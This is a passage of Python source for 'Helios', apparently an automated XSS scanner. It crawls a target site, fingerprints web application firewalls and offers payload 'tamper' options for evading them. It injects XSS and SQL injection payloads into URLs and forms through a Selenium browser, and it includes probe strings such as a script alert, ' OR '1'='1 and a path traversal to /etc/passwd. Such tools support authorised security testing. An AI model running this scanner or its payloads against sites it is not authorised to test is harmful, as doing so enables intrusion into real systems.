            self.print_and_save(f"[*] Testing DOM XSS URL with fragment: {test_url}", important=True)
            
            if await self.test_single_payload(test_url, payload):
                return {'payload': payload, 'url': test_url}

        return None
    
    async def test_single_payload(self, test_url, payload):
        await asyncio.to_thread(self.driver.get, test_url)
        return await self.check_exploitation(payload)

    def generate_exploit_info(self, source, sink, payload, exploit_url, is_external, script_url):
        exploit_info = f"{bcolors.BOLD}{bcolors.OKGREEN}Vulnerable Source: {source}{bcolors.ENDC}\n"
        exploit_info += f"{bcolors.BOLD}{bcolors.OKGREEN}Vulnerable Sink: {sink}{bcolors.ENDC}\n"
        exploit_info += f"{bcolors.BOLD}{bcolors.OKGREEN}Payload: {payload}{bcolors.ENDC}\n"
        exploit_info += f"{bcolors.BOLD}{bcolors.OKGREEN}Exploit URL: {exploit_url}{bcolors.ENDC}\n"
        
        if is_external:
            exploit_info += f"{bcolors.WARNING}Vulnerable External Script: {script_url}\n"
        
        return exploit_info
    
    async def run_scan(self):
        self.print_and_save(f"[*] Starting XSS scan on {self.target_url}")
        start_time = time.time()

        self.start_rps_monitor()

        try:
            await self.create_session()
            async with aiohttp.ClientSession(headers=self.custom_headers, cookies=self.cookies) as session:
                self.session = session
                try:
                    self.driver = await asyncio.to_thread(self.setup_driver)
                    if self.driver is None:
                        self.print_and_save("[!] Browser setup failed. Exiting...", important=True)
                        return

                except BrowserNotFoundError as e:
                    self.print_and_save(f"\n[!] {str(e)}", important=True)
                    self.print_and_save("[!] Please install the required browser and try again.", important=True)
                    return
                
                await self.detect_waf()

                # Initialize URL queue
                self.url_queue = asyncio.Queue()

                if self.crawl:
                    await self.crawl_website(self.target_url, self.crawl_depth)
                    self.print_and_save(f"[*] Crawling complete. Discovered {len(self.discovered_urls)} URLs.", important=True)
                else:
                    self.discovered_urls.add(self.target_url)

                # Add all discovered URLs to the queue
                for url in self.discovered_urls:
                    await self.url_queue.put(url)

                self.print_and_save(f"[*] URLs in queue: {self.url_queue.qsize()}", important=True)
                for url in self.discovered_urls:
                    self.print_and_save(f"[*] Discovered URL: {bcolors.BOLD}{url}{bcolors.ENDC}", important=True)

               # Process URLs from the queue
                tasks = []
                for _ in range(min(self.threads, len(self.discovered_urls))):
                    task = asyncio.create_task(self.process_url_queue())
                    tasks.append(task)

                # Wait for all tasks to complete
                await self.url_queue.join()

                # Cancel any remaining tasks
                for task in tasks:
                    task.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)

        except asyncio.CancelledError:
            self.print_and_save("\n[!] Scan cancelled...", important=True)
        except Exception as e:
            self.print_and_save(f"\n[!] An unexpected error occurred: {str(e)}", important=True)
            import traceback
            self.print_and_save(traceback.format_exc(), important=True)
        
        finally:
            # Add detailed summary of findings
            if self.vulnerabilities_found:
                self.print_and_save("\n[*] Scan Summary:", important=True)
                for vuln in self.vulnerabilities_found:
                    self.print_and_save(f"[+] {vuln['type']} vulnerability detected:", important=True)
                    self.print_and_save(f"    Method: {vuln['method']}", important=True)
                    self.print_and_save(f"    URL: {vuln['url']}", important=True)
                    self.print_and_save(f"    Parameter: {vuln['parameter']}", important=True)
                    self.print_and_save(f"    Payload: {vuln['payload']}", important=True)
                    if 'details' in vuln:
                        self.print_and_save(f"    Details: {vuln['details']}", important=True)
                    # self.print_and_save("", important=True)  # Empty line for readability
            else:
                self.print_and_save("[*] No vulnerabilities were found during the scan.", important=True)
            
            print(f"\n{bcolors.PURPLE}Scan finished in {time.time() - start_time:.2f} seconds{bcolors.ENDC}")
            
            self.print_and_save(f"{bcolors.WARNING}[!]{bcolors.ENDC} Helios has concluded testing {self.target_url}.", important=True)

            # Final cleanup
            sys.stdout.write('\r\033[K')  # Clear the last line (RPS counter)
            sys.stdout.flush()
            await self.cleanup()

    async def process_url_queue(self):
        while True:
            try:
                url = await self.url_queue.get()
                self.print_and_save(f"[*] Starting to process URL: {url}", important=True)
                try:
                    await self.scan_single_url(url)
                except Exception as e:
                    self.print_and_save(f"[!] Error processing URL {url}: {str(e)}", important=True)
                finally:
                    self.print_and_save(f"[*] Finished processing URL: {url}", important=True)
                    self.url_queue.task_done()
            except asyncio.CancelledError:
                break
            
            if self.url_queue.empty():
                break

    async def detect_waf(self):
        waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status'],
            'Akamai': ['akamai-gtm', 'ak_bmsc'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'Sucuri': ['sucuri-clientside'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'F5 BIG-IP': ['BIGipServer'],
            'Barracuda': ['barra_counter_session'],
            'Citrix NetScaler': ['ns_af=', 'citrix_ns_id'],
            'Amazon WAF': ['x-amz-cf-id', 'x-amzn-RequestId'],
            'Wordfence': ['wordfence_verifiedHuman'],
            'Fortinet FortiWeb': ['FORTIWAFSID='],
            'Imperva': ['X-Iinfo', '_pk_id'],
            'Varnish': ['X-Varnish'],
            'StackPath': ['X-SP-GATEWAY'],
            'Fastly': ['Fastly-SSL']
        }

        detected_wafs = set()

        # Standard header check
        async with self.session.get(self.target_url) as response:
            headers = response.headers
            cookies = response.cookies

            for waf, signatures in waf_signatures.items():
                for signature in signatures:
                    if signature.lower() in [header.lower() for header in headers] or signature in cookies:
                        detected_wafs.add(waf)
                        break

        # Behavioral checks
        payloads = [
            "<script>alert('XSS')</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
            "/?param=<script>alert('XSS')</script>"
        ]

        for payload in payloads:
            try:
                async with self.session.get(f"{self.target_url}{payload}", allow_redirects=False) as response:
                    if response.status in [403, 406, 429, 503]:
                        detected_wafs.add("Unknown WAF (based on behavior)")
                        break
                    
                    text = await response.text()
                    if any(keyword in text.lower() for keyword in ['waf', 'firewall', 'malicious', 'blocked', 'security']):
                        detected_wafs.add("Generic WAF detected")
                        break
            except Exception as e:
                self.print_and_save(f"[!] Error during WAF behavioral check: {str(e)}", important=True)

        # Check for specific WAF responses
        try:
            async with self.session.get(f"{self.target_url}/?_test_waf=1", allow_redirects=False) as response:
                text = await response.text()
                if "blocked" in text.lower() or "firewall" in text.lower():
                    detected_wafs.add("Generic WAF detected")
        except Exception as e:
            self.print_and_save(f"[!] Error during WAF specific response check: {str(e)}", important=True)

        # Report results
        if detected_wafs:
            self.print_and_save(f"[!] WAF(s) detected: {', '.join(detected_wafs)}", important=True)
            self.print_and_save("[!] WAF presence may affect scan results or require evasion techniques.", important=True)
        else:
            self.print_and_save("[*] No WAF detected.")
        
        self.detected_wafs = list(detected_wafs)
        return self.detected_wafs

    def async_handle_alerts(func):
        @wraps(func)
        async def wrapper(self, *args, **kwargs):
            try:
                return await func(self, *args, **kwargs)
            except Exception as e:
                if "UnexpectedAlertPresentException" in str(e) or "UnexpectedAlertOpenError" in str(e):
                    try:
                        alert = await asyncio.to_thread(self.driver.switch_to.alert)
                        alert_text = await asyncio.to_thread(lambda: alert.text)
                        self.print_and_save(f"[+] Alert detected: {alert_text}")
                        if self.canary_string in alert_text:
                            self.print_and_save(f"[+] XSS confirmed! Canary string found in alert: {self.canary_string}")
                            await asyncio.to_thread(alert.accept)
                            return True
                        await asyncio.to_thread(alert.accept)
                        return None
                    except:
                        pass
                raise
        return wrapper
    
    @async_handle_alerts
    async def find_and_click_submit(self):
        submit_xpath = "//input[@type='submit'] | //button[@type='submit'] | //button[contains(@class, 'submit')] | //input[contains(@class, 'submit')]"
        element = await self.find_and_interact_with_element(By.XPATH, submit_xpath, action='click')
        
        if element is not None:
            self.print_and_save("[*] Successfully clicked submit button")
            return True
        else:
            self.print_and_save("[!] Failed to click submit button after multiple attempts")
            return False

    @async_handle_alerts
    async def find_and_interact_with_element(self, by, locator, action='click', input_value=None, max_attempts=3):
        for attempt in range(max_attempts):
            try:
                if not await self.wait_for_page_stability():
                    self.print_and_save("[!] Page did not stabilize, attempting interaction anyway")

                element = await asyncio.to_thread(
                    WebDriverWait(self.driver, 10).until,
                    EC.presence_of_element_located((by, locator))
                )
                
                is_attached = await asyncio.to_thread(
                    self.driver.execute_script, "return arguments[0].isConnected;", element
                )
                if not is_attached:
                    raise Exception("Element is not attached to the DOM")

                await asyncio.to_thread(
                    self.driver.execute_script, "arguments[0].scrollIntoView(true);", element
                )

                await asyncio.sleep(1)

                if action == 'click':
                    await asyncio.to_thread(
                        WebDriverWait(self.driver, 10).until,
                        EC.element_to_be_clickable((by, locator))
                    )
                    await asyncio.to_thread(element.click)
                elif action == 'send_keys':
                    await asyncio.to_thread(element.clear)
                    await asyncio.to_thread(element.send_keys, input_value)
                
                return element
            except Exception as e:
                if "StaleElementReferenceException" in str(e) or "Element is not attached to the DOM" in str(e):
                    self.print_and_save(f"[!] Stale element or element detached for {locator}, retrying...")
                    await asyncio.sleep(1)
                else:
                    self.print_and_save(f"[!] Error interacting with element: {str(e)}")
                    break

        return None

    async def wait_for_page_stability(self, timeout=10, check_interval=0.5):
        start_time = time.time()
        last_source = await asyncio.to_thread(lambda: self.driver.page_source)
        
        while time.time() - start_time < timeout:
            await asyncio.sleep(check_interval)
            current_source = await asyncio.to_thread(lambda: self.driver.page_source)
            if current_source == last_source:
                return True
            last_source = current_source
        
        self.print_and_save(f"[!] Page did not stabilize within {timeout} seconds")
        return False


    async def check_exploitation(self, payload):
        alert_detected = False
        script_executed = False

        # Check for alert
        try:
            alert = await asyncio.wait_for(
                asyncio.to_thread(WebDriverWait(self.driver, 5).until, EC.alert_is_present()),
                timeout=5.0
            )
            alert_text = await asyncio.to_thread(lambda: alert.text)
            self.print_and_save(f"[+] {bcolors.BOLD}Alert detected with text: {bcolors.OKGREEN}{alert_text}{bcolors.ENDC}")
            if self.canary_string in alert_text:
                self.print_and_save(f"[+] XSS confirmed! Canary string found in alert: {self.canary_string}")
            alert_detected = True
            await asyncio.to_thread(alert.accept)
        except asyncio.TimeoutError:
            self.print_and_save(f"{bcolors.FAIL}[-]{bcolors.ENDC}  No alert detected")
        except Exception as e:
            if "UnexpectedAlertPresentException" in str(e):
                self.print_and_save(f"[+] {bcolors.BOLD}Alert detected but was dismissed{bcolors.ENDC}")
                alert_detected = True

        # Check if payload is in the page source
        page_source = await asyncio.to_thread(lambda: self.driver.page_source)
        if payload in page_source:
            self.print_and_save("[+] Payload found in page source")

        # Check for script execution
        try:
            xss_test = await asyncio.to_thread(
                self.driver.execute_script, "return window.xss_test;"
            )
            if xss_test:
                self.print_and_save("[+] Script execution confirmed via xss_test variable")
                script_executed = True
        except Exception as e:
            self.print_and_save(f"[-] Error checking script execution: {str(e)}")

        if alert_detected and script_executed:
            return "Alert detected and script executed"
        elif alert_detected:
            return "Alert detected"
        elif script_executed:
            return "Script executed (potential XSS)"
        elif payload in page_source:
            return "Payload reflected but not executed"
        else:
            return None
    
    @async_handle_alerts
    async def test_payload(self, session, url, payload, method='GET', data=None, headers=None):
        original_payload = payload
        payload = self.customize_payload(payload)
        self.print_and_save(f"[*] Testing payload: {original_payload}", important=True)
        
        try:
            if method == "GET":
                self.print_and_save(f"[*] Sending GET request to: {url.replace(original_payload, payload)}", important=True)
                await asyncio.to_thread(self.driver.get, url.replace(original_payload, payload))
            elif method == "POST":
                self.print_and_save(f"[*] Sending POST request to: {url}", important=True)
                await asyncio.to_thread(self.driver.get, url)
                
                form_filled = await self.fill_and_submit_form(data, original_payload, payload)
                if not form_filled:
                    self.print_and_save("[!] Could not interact with form properly, but continuing with exploitation check")

            self.log_request()
            result = await self.quick_check_exploitation(payload)
            
            if result['xss']:
                vuln_info = {
                    'type': 'XSS',
                    'method': method,
                    'url': url,
                    'payload': original_payload,
                    'parameter': next(iter(data)) if data else 'N/A'
                }
                self.print_and_save(f"[+] XSS vulnerability confirmed with payload: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)
                self.print_and_save(f"[+] XSS details: {', '.join(result['details'])}", important=True)
                self.vulnerabilities_found.append(vuln_info)

                return True
            if result['sql_injection']:
                vuln_info = {
                    'type': 'SQL Injection',
                    'method': method,
                    'url': url,
                    'payload': original_payload,
                    'parameter': next(iter(data)) if data else 'N/A'
                }
                self.print_and_save(f"[!] Possible {bcolors.BOLD}{bcolors.fail}SQL injection{bcolors.ENDC} vulnerability detected with payload: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)
                self.print_and_save(f"[!] SQL Injection details: {', '.join(result['details'])}", important=True)
                self.vulnerabilities_found.append(vuln_info)

                return True
            if result['reflection']:
                self.print_and_save(f"[*] Payload reflected, potential XSS vulnerability: {bcolors.WARNING}{original_payload}{bcolors.ENDC}")
                self.print_and_save(f"[*] Reflection details: {', '.join(result['details'])}")
                return   # Consider reflection as a potential vulnerability
            else:
                self.print_and_save(f"[-] No vulnerability detected with payload: {original_payload}")
            
            return False

        except Exception as e:
            self.print_and_save(f"[!] Error testing payload")
            # try:
            #     page_source = await asyncio.to_thread(lambda: self.driver.page_source)
            #     self.print_and_save(f"[!] Page source at time of error:\n{page_source}", important=True)
            # except Exception as page_source_error:
            #     self.print_and_save(f"[!] Unable to retrieve page source: {str(page_source_error)}", important=True)
        return False

    async def fill_and_submit_form(self, data, original_payload, payload):
        try:
            for field_name, field_value in data.items():
                element = await self.find_element(By.NAME, field_name)
                if element:
                    tag_name = await asyncio.to_thread(lambda: element.tag_name.lower())
                    element_type = await asyncio.to_thread(lambda: element.get_attribute('type').lower())
                    
                    if tag_name == 'input' and element_type in ['text', 'password', 'email', 'number', 'tel', 'url']:
                        await asyncio.to_thread(element.clear)
                        await asyncio.to_thread(element.send_keys, field_value.replace(original_payload, payload))
                    elif tag_name == 'textarea':
                        await asyncio.to_thread(element.clear)
                        await asyncio.to_thread(element.send_keys, field_value.replace(original_payload, payload))
                    elif tag_name == 'select':
                        select = Select(element)
                        await asyncio.to_thread(select.select_by_visible_text, field_value.replace(original_payload, payload))
                    elif tag_name == 'input' and element_type == 'submit':
                        # This is our submit button, no need to fill it
                        continue
                    else:
                        self.print_and_save(f"[!] Unsupported form element: {tag_name} of type {element_type}")

            submit_button = await self.find_element(By.XPATH, "//input[@type='submit'] | //button[@type='submit']")
            if submit_button:
                await asyncio.to_thread(submit_button.click)
                await asyncio.sleep(1)  # Short wait for form submission
                return True
            else:
                self.print_and_save("[!] Could not find submit button")
                return False
        except Exception as e:
            self.print_and_save(f"[!] Error filling and submitting form")
            return False
        
    async def find_element(self, by, locator, timeout=5):
            try:
                element = await asyncio.to_thread(
                    WebDriverWait(self.driver, timeout).until,
                    EC.presence_of_element_located((by, locator))
                )
                return element
            except TimeoutException:
                return None
    
    async def quick_check_exploitation(self, payload):
        result = {
            'xss': False,
            'sql_injection': False,
            'reflection': False,
            'details': []
        }

        try:
            # Check for alert
            try:
                alert_present = await asyncio.to_thread(
                    lambda: WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                )
                if alert_present:
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    result['xss'] = True
                    result['details'].append(f"Alert detected: {alert_text}")
                    alert.accept()
            except TimeoutException:
                pass  # No alert present

            # Get page source
            try:
                page_source = await asyncio.to_thread(lambda: self.driver.page_source)
            except UnexpectedAlertPresentException:
                # If an alert is present when trying to get page source, handle it
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                result['xss'] = True
                result['details'].append(f"Alert detected when getting page source: {alert_text}")
                alert.accept()
                # Try to get page source again after accepting the alert
                page_source = await asyncio.to_thread(lambda: self.driver.page_source)

            # Check for payload reflection
            if payload in page_source:
                result['reflection'] = True
                result['details'].append("Payload reflected in page source")

            # Check for SQL error messages
            sql_error_patterns = [
                r"SQL syntax.*?MySQL",
                r"Warning.*?\Wmysqli?_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that (corresponds to|fits) your MySQL server version",
                r"Unknown column '[^']+' in 'field list'",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
                r"Syntax error or access violation",
                r"ORA-[0-9][0-9][0-9][0-9]",
                r"PLS-[0-9][0-9][0-9][0-9]",
                r"PostgreSQL.*?ERROR",
                r"Warning.*?\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError:",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s\ssyntax error at or near ",
                r"ERROR: parser: parse error at or near",
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite\.SQLiteException",
                r"Warning.*?\W(mssql|sqlsrv)_",
                r"MSSQLServer_Error",
                r"\[SQL Server\]",
                r"ODBC SQL Server Driver",
                r"ODBC Driver \d+ for SQL Server",
                r"SQLServer JDBC Driver",
                r"com\.jnetdirect\.jsql",
                r"macromedia\.jdbc\.sqlserver",
                r"com\.microsoft\.sqlserver\.jdbc",
                r"Zend_Db_(Adapter|Statement)_Sqlsrv_Exception",
                r"com\.microsoft\.sqlserver\.jdbc\.SQLServerException",
                r"SQL(State|Server)Exception",
                r"Warning:.*?mysql_.*?\(.*?\)",
                r"mysql_connect\(\)",
                r"Connection refused",
                r"Website is out of order",
            ]

            for pattern in sql_error_patterns:
                if re.search(pattern, page_source, re.IGNORECASE):
                    result['sql_injection'] = True
                    sql_error = "Possible SQL injection vulnerability detected (SQL error message found in response)"
                    result['details'].append(sql_error)
                    result['details'].append(f"SQL Error details: {re.search(pattern, page_source, re.IGNORECASE).group(0)}")
                    break

        except Exception as e:
            # self.print_and_save(f"[-] Error in quick_check_exploitation: {str(e)}")
            pass

        return result

    async def submit_form(self):
        try:
            submit_button = await self.find_and_interact_with_element(
                By.XPATH, "//input[@type='submit'] | //button[@type='submit']",
                action='click'
            )
            if submit_button:
                self.print_and_save("[*] Form submitted successfully")
                return True
            else:
                self.print_and_save("[!] Could not find submit button")
                return False
        except Exception as e:
            self.print_and_save(f"[!] Error submitting form: {str(e)}")
            return False
        
    async def browser_check(self, url, payload):
        await asyncio.to_thread(self.driver.get, url)
        try:
            alert = await asyncio.to_thread(
                WebDriverWait(self.driver, 3).until,
                EC.alert_is_present()
            )
            alert_text = await asyncio.to_thread(lambda: alert.text)
            if self.canary_string in alert_text:
                self.print_and_save(f"[+] XSS confirmed! Canary string found in alert: {self.canary_string}")
                await asyncio.to_thread(alert.accept)
                return True
        except:
            pass

        try:
            xss_test = await asyncio.to_thread(
                self.driver.execute_script, "return window.xss_test;"
            )
            if xss_test:
                self.print_and_save("[+] Script execution confirmed via xss_test variable")
                return "Script executed without alert"
        except Exception as e:
            self.print_and_save(f"[-] Error checking script execution: {str(e)}")

        return None

    async def scan_single_url(self, url):
        if url in self.scanned_urls:
            self.print_and_save(f"[DEBUG] Skipping already scanned URL: {url}", important=True)
            return []
        
        self.print_and_save(f"[*] Scanning URL: {url}")
        results = []
        self.target_url = url
        
        try:
            await asyncio.to_thread(self.driver.get, url)
            self.log_request()
            await self.smart_wait()
            
            if self.detected_wafs:
                results.append("[!] WAF detected. Some tests may be blocked or produce false negatives.")
            
            results.extend(await self.scan_url_parameters())
            results.extend(await self.scan_post_parameters())
            results.extend(await self.scan_dom_content())

            if not self.skip_header_scan:
                results.append(f"[*] Testing headers for: {url}")
                results.extend(await self.scan_headers())
            
            self.scanned_urls.add(url)  # Mark as scanned after successful scan
            return results
        except Exception as e:
            # self.print_and_save(f"[!] Error scanning URL {url}: {str(e)}", important=True)
            return results  # Return whatever results we have, even if there was an error


    async def crawl_website(self, url, depth):
        if depth == 0 or url in self.discovered_urls:
            return

        self.discovered_urls.add(url)
        self.print_and_save(f"[*] Crawling: {url}", important=True)

        try:
            async with self.session.get(url) as response:
                text = await response.text()
            soup = BeautifulSoup(text, 'html.parser')
            if soup is None:
                return
            
            links = [urllib.parse.urljoin(url, link['href']) for link in soup.find_all('a', href=True)]
            valid_links = []
            
            for next_url in links:
                parsed_next_url = urllib.parse.urlparse(next_url)
                parsed_target_url = urllib.parse.urlparse(self.target_url)
                
                if (parsed_next_url.netloc == parsed_target_url.netloc and 
                    parsed_next_url.scheme == parsed_target_url.scheme and
                    next_url not in self.discovered_urls):
                    valid_links.append(next_url)
                    self.discovered_urls.add(next_url)

            await asyncio.gather(*[self.crawl_website(next_url, depth - 1) for next_url in valid_links])

        except Exception as e:
            self.print_and_save(f"[!] Error crawling {url}: {str(e)}", important=True)

async def async_main():
    parser = argparse.ArgumentParser(description="Helios - Automated XSS Scanner")
    parser.add_argument("target", nargs='?', help="Target URL to scan")
    parser.add_argument("-l", "--target-list", help="File containing list of target URLs")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--browser", choices=['firefox', 'chrome', 'chromium'], default='firefox', help="Choose browser driver (default: firefox)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 4)")
    parser.add_argument("--headers", nargs='+', help="Custom headers in the format 'Name:Value'")
    parser.add_argument("--cookies", nargs='+', help="Cookies in the format 'Name=Value'")
    parser.add_argument("-o", "--output", help="Output file to write results")
    parser.add_argument("--payload-file", help="File containing custom XSS payloads")
    parser.add_argument("--scan-headers", action="store_true", help="Enable header scanning")
    parser.add_argument("--crawl", action="store_true", help="Enable crawling of the target website")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Depth of crawling (default: 2)")
    parser.add_argument("--tamper", choices=['doubleencode', 'uppercase', 'hexencode', 'jsonfuzz', 'spacetab', 'all'], 
                        help="Apply evasion technique to payloads")
    args = parser.parse_args()

    if not args.target and not args.target_list:
        parser.error("Either a target URL or a target list file must be provided.")

    custom_headers = {}
    if args.headers:
        for header in args.headers:
            name, value = header.split(':', 1)
            custom_headers[name.strip()] = value.strip()

    cookies = {}
    if args.cookies:
        for cookie in args.cookies:
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()

    targets = []
    if args.target is not None:
        print(f"{bcolors.OKBLUE}[*]{bcolors.ENDC} Target URL: {bcolors.BOLD}{args.target}{bcolors.ENDC}\n")
    if args.target_list:
        with open(args.target_list, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(targets)} target URLs from {args.target_list}")
    elif args.target:
        targets = [args.target]

    try:
        for target in targets:
            scanner = XSSScanner(target, args.browser, args.headless, args.threads, 
                                 custom_headers, cookies, args.output, args.payload_file, args.tamper)
            scanner.verbose = args.verbose
            scanner.skip_header_scan = not args.scan_headers
            scanner.crawl = args.crawl
            scanner.crawl_depth = args.crawl_depth

            await scanner.run_scan()

    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Exiting...")
    finally:
        # if scanner:
            # await scanner.cleanup()
        # Ensure all resources are properly closed
        tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Close any remaining aiohttp sessions
        for task in tasks:
            if hasattr(task, 'session') and not task.session.closed:
                await task.session.close()

def main():
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    asyncio.run(async_main())

if __name__ == "__main__":
    try:
        banner()
        main()
    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        exit(0)